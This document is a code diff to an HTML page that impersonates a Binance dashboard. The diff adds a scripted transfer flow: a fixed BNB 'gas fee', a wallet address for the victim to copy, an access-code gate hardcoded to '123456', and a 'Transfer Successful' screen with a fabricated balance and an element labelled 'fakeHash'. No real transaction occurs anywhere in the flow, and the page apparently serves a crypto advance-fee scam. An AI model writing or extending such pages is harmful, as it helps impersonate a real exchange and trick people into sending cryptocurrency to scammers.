@@ -2,7 +2,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Binance Exchange Dashboard</title>
+  <title>Binance Web3</title>
   <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
@@ -168,13 +168,74 @@
   </div>
   <button onclick="goToPreviousPage()" class="text-sm text-yellow-400 hover:underline mb-6">← Back</button>
 </section>  
-  <!-- Page 8: Transfer --> 
-  <section id="page8" class="page">
-    <div class="p-10 text-center">
-      <h2 class="text-2xl font-semibold mb-4">Transfer Assets</h2>
-      <p class="mb-4">Initiate USDT or BNB transfer.</p>
-    </div>
-  </section>  
+  <!-- ✅ PAGE 8 - TRANSFER TO MAIN WALLET --><section id="page8" class="page hidden min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-4 transition-opacity duration-300">
+  <div class="w-full max-w-md bg-[#10151c] p-6 rounded-xl shadow-xl">
+    <h2 class="text-2xl font-bold text-yellow-400 mb-4">Transfer to Main Wallet</h2><label class="block text-sm mb-1">Amount (USDT)</label>
+<input id="transferAmount" type="number" placeholder="Enter amount" class="w-full mb-4 p-3 rounded bg-[#1c232b] border border-gray-600 text-white">
+
+<div class="flex justify-between items-center mb-4">
+  <span class="text-sm">Gas Fee</span>
+  <span class="text-yellow-400 font-semibold">0.09490 BNB</span>
+</div>
+
+<button onclick="showPage('page9')" class="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-2 rounded transition-all">Confirm Transfer</button>
+
+  </div>
+</section>
+  <!-- ✅ PAGE 9 - TRANSACTION PROCESSING -->
+  <section id="page9" class="page hidden min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-4 transition-opacity duration-300">
+  <div class="flex flex-col items-center">
+    <div class="loader mb-6"></div>
+    <p class="text-xl font-semibold text-yellow-400 mb-2">Processing Transaction</p>
+    <p class="text-sm text-gray-400">Please wait while we process your transaction...</p>
+    <script>
+      setTimeout(() => showPage('page9i'), 3000);
+    </script>
+  </div>
+</section>
+  <!-- ✅ PAGE 9i - BNB GAS CONFIRMATION -->
+  <section id="page9i" class="page hidden min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-4 transition-opacity duration-300">
+  <div class="w-full max-w-md bg-[#10151c] p-6 rounded-xl shadow-xl">
+    <h2 class="text-xl font-bold text-yellow-400 mb-4">BNB Gas Confirmation</h2>
+    <p class="text-sm text-gray-300 mb-4">Please confirm your BNB gas fee address:</p><div class="flex items-center justify-between bg-[#1c232b] p-3 rounded mb-4">
+  <span id="bnbAddress" class="truncate">0xAb...cDe5</span>
+  <button onclick="copyBNBAddress()" class="text-yellow-400 hover:underline text-sm">Copy</button>
+</div>
+
+<button onclick="showPage('page9ii')" class="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-2 rounded">Confirm BNB Gas Code</button>
+
+  </div>
+</section>
+  <!-- ✅ PAGE 9ii - ACCESS CODE + QR CODE -->
+  <section id="page9ii" class="page hidden min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-4 transition-opacity duration-300">
+  <div class="w-full max-w-md bg-[#10151c] p-6 rounded-xl shadow-xl text-center">
+    <h2 class="text-xl font-bold text-yellow-400 mb-4">Access Code Required</h2><canvas id="accessQr" class="mx-auto mb-4"></canvas>
+<p class="text-sm text-gray-400 mb-2">Scan the code or enter the access code below:</p>
+<input id="accessCodeInput" placeholder="Enter access code" class="w-full mb-4 p-3 rounded bg-[#1c232b] border border-gray-600 text-white text-center">
+
+<button onclick="verifyAccessCode()" class="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-2 rounded">Submit Code</button>
+
+  </div>
+</section>
+  <!-- ✅ PAGE 11 - TRANSACTION DECLINED -->
+  <section id="page11" class="page hidden min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-4 transition-opacity duration-300">
+  <div class="text-center">
+    <h2 class="text-2xl font-bold text-red-500 mb-4">Transaction Declined</h2>
+    <p class="text-sm text-gray-400 mb-6">Access code was incorrect. Please try again or contact support.</p>
+    <button onclick="showPage('page9ii')" class="bg-yellow-500 text-black font-bold py-2 px-4 rounded">Try Again</button>
+  </div>
+</section>
+  <!-- ✅ PAGE 14 - TRANSACTION SUCCESS -->
+  <section id="page14" class="page hidden min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-4 transition-opacity duration-300">
+  <div class="text-center max-w-md">
+    <h2 class="text-2xl font-bold text-green-500 mb-4">✅ Transfer Successful</h2>
+    <p class="text-sm text-gray-300 mb-2">Amount Transferred: <span class="text-yellow-400 font-semibold">$3,078.78 USDT</span></p>
+    <p class="text-sm text-gray-300">Transaction Hash:</p>
+    <p id="fakeHash" class="text-xs text-gray-400 mt-1 cursor-pointer hover:text-yellow-400">0xa3e...d5f9b<span></span></p>
+  </div>
+</section>
+  <!-- ✅ TOAST SYSTEM -->
+  <div id="toast" class="fixed bottom-5 left-1/2 transform -translate-x-1/2 bg-gray-900 text-white px-4 py-2 rounded-xl shadow-lg text-sm hidden z-50"></div><!-- ✅ ANIMATIONS + UTILS -->
   <!-- === PAGE 16: Earn Menu (Updated Blockchain.com Style) === -->
   <section id="page16" class="page min-h-screen bg-[#0b0e11] text-[#f3ba2f] font-sans px-6 py-8">
   <div class="max-w-6xl mx-auto">
@@ -652,5 +713,61 @@ window.addEventListener("load", () => {
   }
 });
 </script>
+  <script>
+function showPage(pageId) {
+  const current = document.querySelector('.page:not(.hidden)');
+  const next = document.getElementById(pageId);
+  if (current && next && current !== next) {
+    current.classList.add('opacity-0');
+    setTimeout(() => {
+      current.classList.add('hidden');
+      current.classList.remove('opacity-0');
+      next.classList.remove('hidden');
+      next.classList.add('opacity-0');
+      setTimeout(() => {
+        next.classList.remove('opacity-0');
+      }, 50);
+    }, 300);
+  }
+}
+
+function showToast(msg) {
+  const toast = document.getElementById('toast');
+  toast.innerText = msg;
+  toast.classList.remove('hidden');
+  setTimeout(() => toast.classList.add('hidden'), 3000);
+}
+
+function copyBNBAddress() {
+  navigator.clipboard.writeText('0xAbCdEf1234567890...').then(() => {
+    showToast("BNB Address Copied");
+  });
+}
+
+function verifyAccessCode() {
+  const code = document.getElementById('accessCodeInput').value.trim();
+  showToast("Verifying Access Code...");
+  setTimeout(() => {
+    if (code === "123456") {
+      showPage('page14');
+    } else {
+      showPage('page11');
+    }
+  }, 2000);
+}
+
+window.onload = () => {
+  const canvas = document.getElementById('accessQr');
+  if (canvas && window.QRCode) {
+    new QRCode(canvas, {
+      text: "AccessCode:123456",
+      width: 128,
+      height: 128,
+      colorDark: "#ffffff",
+      colorLight: "#0b0e11",
+    });
+  }
+}
+  </script>
 </body>
 </html>
